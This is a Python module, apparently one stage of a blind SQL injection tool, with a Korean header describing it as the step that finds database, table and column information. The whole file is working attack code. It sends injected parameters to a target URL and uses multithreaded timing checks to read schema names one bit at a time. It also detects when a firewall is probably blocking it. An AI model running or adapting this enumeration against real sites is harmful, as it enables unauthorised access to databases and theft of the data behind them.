"""
3단계
- DB, TABLE, COLUMN 정보 찾는 거구요
- 주휘상
"""

# from getexable import Payload
# from gettype import DBType

from datetime import timedelta
from typing import Callable, Iterable, Literal
from requests import Response


import requests
import tqdm
import time

from getinfo_command import *
from dbtype import DBType
from utils.threading_extend import ThreadResult, startall

from halo import Halo



DEFAULT_ERR_RANGE = 0.5

spinner = Halo(text='Attacking... Please wait', spinner='str', text_color="white", animation="dots5")




class Link:
    url: str
    method: Literal['GET', 'POST']
    params: dict[str, str]
    def __init__(self, url, method: str, params) -> None:
        self.url = url
        self.method = method.upper()
        self.params = params
    def request(self, params: dict[str, str] = {}) -> Response:
        if self.method == "GET":
            res = requests.get(self.url, params={**self.params, **params})
        else:
            res = requests.post(self.url, data={**self.params, **params})
        return res

class Payload:
    link: Link
    key: str
    value: str
    form: str
    delay_command: str
    def __init__(self, link, key, value, form, delay_command) -> None:
        self.link = link
        self.key = key
        self.value = value
        self.form = form
        self.delay_command = delay_command
    def request_command(self, command: str) -> Response:
        toexec = command.format(delay_command=self.delay_command)
        value = self.form.format(toexec=toexec)
        res = self.link.request(params={self.key: value})
        return res
    # def try_request_command(self, command: str) -> bool:
    #     res = self.request_command(command)
    #     if res.elapsed+timedelta(seconds=DEFAULT_ERR_RANGE)

def create_checker(normal_sec: float, err_range: float = DEFAULT_ERR_RANGE):
    def checker(try_sec: float) -> bool:
        return normal_sec+err_range<try_sec
    return checker
checker = create_checker(0.2, 0.5)


class GetInfoError(Exception): ...
class WAFFilterError(GetInfoError): ...
class DuplicateValuesError(GetInfoError): ...

class GetInfo:
    is_exed: Callable[[float], bool]
    payload: Payload
    dbtype: DBType
    pbar: tqdm.tqdm
    def __init__(self, is_exed, payload, dbtype) -> None:
        self.is_exed = is_exed
        self.payload = payload
        self.dbtype = dbtype
        # self.pbar = tqdm.tqdm(total=0, desc=f"[{time.strftime('%X')}] Information")

    def attack(self) -> dict[str, dict[str, list]]:
        spinner.start()
        dbinfo: dict[str, dict[str, list]] = {}
        databases = self.get_information_databases()
        # print("databases:", databases)
        for database in databases:
            dbinfo[database] = {}
            tables = self.get_information_tables(database)
            # print(f"database({database}) - tables: {tables}")
            for table in tables:
                columns = self.get_information_columns(database, table)
                # print(f"table({table}) - columns: {columns}")
                dbinfo[database][table] = columns
        # self.pbar.close()
        spinner.succeed('[{0}] Succesed Attack'.format(time.strftime('%X')))
        return dbinfo

    def get_information_databases(self) -> list[str]:
        dbnames = []
        dbnum = self.get_integer(database_count_command[self.dbtype], title="Count Database Num")
        # self.pbar.total += dbnum*2 + 1
        # self.pbar.set_description(f"[{time.strftime('%X')}] Information")
        # self.pbar.update(1)
        for row_idx in range(dbnum):
            dbname_length = self.get_integer(database_name_length_command[self.dbtype], title="Database Name Length", row_idx=row_idx)
            # self.pbar.set_description(f"[{time.strftime('%X')}] Information")
            # self.pbar.update(1)
            # print(row_idx, ', length:', dbname_length)
            dbname = self.get_string(database_name_command[self.dbtype], dbname_length, title="Database Name", row_idx=row_idx)
            # self.pbar.set_description(f"[{time.strftime('%X')}] Information")
            # self.pbar.update(1)
            dbnames.append(dbname)
        return dbnames

    def get_information_tables(self, dbname: str) -> list[str]:
        tbnames = []
        tbnum = self.get_integer(table_count_command[self.dbtype], title=f"Count '{dbname}' Table Num", database_name=dbname)
        # self.pbar.total += tbnum*2 + 1
        # self.pbar.set_description(f"[{time.strftime('%X')}] Information")
        # self.pbar.update(1)
        for row_idx in range(tbnum):
            tbname_length = self.get_integer(table_name_length_command[self.dbtype], title="Table Name Length", row_idx=row_idx, database_name=dbname)
            # self.pbar.set_description(f"[{time.strftime('%X')}] Information")
            # self.pbar.update(1)
            tbname = self.get_string(table_name_command[self.dbtype], tbname_length, title="Table Name", row_idx=row_idx, database_name=dbname)
            # self.pbar.set_description(f"[{time.strftime('%X')}] Information")
            # self.pbar.update(1)
            tbnames.append(tbname)
        return tbnames

    def get_information_columns(self, dbname: str, tbname: str) -> list[str]:
        clmnames = []
        clmnum = self.get_integer(column_count_command[self.dbtype], title=f"Count '{dbname}.{tbname}' Column Num", database_name=dbname, table_name=tbname)
        # self.pbar.total += clmnum*2 + 1
        # self.pbar.set_description(f"[{time.strftime('%X')}] Information")
        # self.pbar.update(1)
        for row_idx in range(clmnum):
            clmname_length = self.get_integer(column_name_length_command[self.dbtype], title="Column Name Length", row_idx=row_idx, database_name=dbname, table_name=tbname)
            # self.pbar.set_description(f"[{time.strftime('%X')}] Information")
            # self.pbar.update(1)
            clmname = self.get_string(column_name_command[self.dbtype], clmname_length, title="Column Name", row_idx=row_idx, database_name=dbname, table_name=tbname)
            # self.pbar.set_description(f"[{time.strftime('%X')}] Information")
            # self.pbar.update(1)
            clmnames.append(clmname)
        return clmnames

    def get_integer(self, command: str, title: str = "Integer", **kwargs: dict[str, str]) -> int:
        
        # print('get_integer:', command)
        ONCE_THREAD_NUM = 20
        MAX_COUNT = 1000
        #pbar: tqdm.tqdm
        def _tester(command: str):
            res = self.payload.request_command(command)
            #pbar.set_description(f"[{time.strftime('%X')}] {title}")
            #pbar.update(1)
            return res
        i = 0
        while 1:
            # promises: list[PromiseRequest] = []
            if i > MAX_COUNT:
                raise WAFFilterError("Probably blocked by a firewall")
            threads: list[ThreadResult] = []
            #pbar = tqdm.tqdm(total=20, desc=f"[{time.strftime('%X')}] {title}")
            for _ in range(ONCE_THREAD_NUM):
                # promises.append(PromiseRequest(self.ex_request, command.format(integer=i, **kwargs)))
                threads.append(ThreadResult(target=_tester, args=(command.format(integer=i, **kwargs),), daemon=True))
                i+=1
            responses: list[Response] = startall(threads)
            #pbar.close()
            results = tuple(map(lambda x:self.is_exed(x), responses))
            if any(results):
                if sum(results) != 1:
                    raise DuplicateValuesError(f"Not one result: {sum(results)}. Perhaps a network or server problem. Try increasing delay time.")
                return results.index(True) + i-ONCE_THREAD_NUM
    
    def get_string(self, command: str, length: int, title: str = "String ", **kwargs: dict[str, str]) -> str:
        # print('get_string:', command)
        threads: list[ThreadResult] = []
        #pbar = tqdm.tqdm(total=length*7, desc=f"[{time.strftime('%X')}] {title} ")
        def _tester(command: str):
            res = self.payload.request_command(command)
            #pbar.set_description(f"[{time.strftime('%X')}] {title} ")
            #pbar.update(1)
            return res
        for str_idx in range(1, length+1):
            for bin_idx in range(1, 8):
                threads.append(ThreadResult(target=_tester, args=(command.format(str_idx=str_idx, bin_idx=bin_idx, **kwargs),), daemon=True))
        responses: list[Response] = startall(threads)
        #pbar.close()
        results = tuple(map(lambda x:int(self.is_exed(x)), responses))
        #spinner.succeed(['succecs'])
        return bin2str(results)

#7자릿수 2진법 -> ascii
def bin2str(bin: Iterable[int]) -> str:
    sum = 0
    for i in range(len(bin)):
        sum <<= 1
        if i%7==0:
            sum <<= 1
        sum += bin[i]
    return sum.to_bytes(len(bin)//7, 'big').decode()